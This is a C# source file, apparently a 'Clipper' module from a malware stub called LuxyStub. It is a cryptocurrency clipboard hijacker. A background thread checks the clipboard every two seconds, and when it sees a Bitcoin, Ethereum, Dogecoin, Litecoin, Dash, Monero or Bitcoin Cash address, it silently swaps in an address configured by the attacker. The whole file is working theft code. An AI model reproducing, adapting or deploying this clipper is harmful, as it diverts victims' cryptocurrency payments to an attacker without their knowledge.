using System;
using System.Threading;

namespace LuxyStub.Modules.Clipper
{
    internal static class Clipper
    {
        private static string prevClipboard = "";
        private static string currentClipboard = "";
        private static readonly Thread MainThread = new Thread(CryptoClipper);

        public static void Start()
        {
            MainThread.Start();
        }

        private static void CryptoClipper()
        {
            while (true)
            {
                Thread.Sleep(2000);
                currentClipboard = Clipboard.GetText();

                if (string.IsNullOrEmpty(currentClipboard)) continue;
                if (prevClipboard == currentClipboard) continue;

                prevClipboard = currentClipboard;

                int result = RegexAddress.CheckCryptoAddress(currentClipboard);
                if (result == -1) continue;

                switch (result)
                {
                    case 0:
                        if (!Settings.BtcClip) break;
                        Replace(Settings.BtcAddr);
                        break;

                    case 1:
                        if (!Settings.EthClip) break;
                        Replace(Settings.EthAddr);
                        break;

                    case 2:
                        if (!Settings.DogeClip) break;
                        Replace(Settings.DogeAddr);
                        break;

                    case 3:
                        if (!Settings.LtcClip) break;
                        Replace(Settings.LtcAddr);
                        break;

                    case 4:
                        if (!Settings.DashClip) break;
                        Replace(Settings.DashAddr);
                        break;

                    case 5:
                        if (!Settings.XmrClip) break;
                        Replace(Settings.XmrAddr);
                        break;

                    case 6:
                        if (!Settings.BchClip) break;
                        Replace(Settings.BchAddr);
                        break;
                }
            }
        }

        private static void Replace(string content)
        {
            Clipboard.SetText(content);
            Console.WriteLine($"Replace to {content}");
        }

    }
}
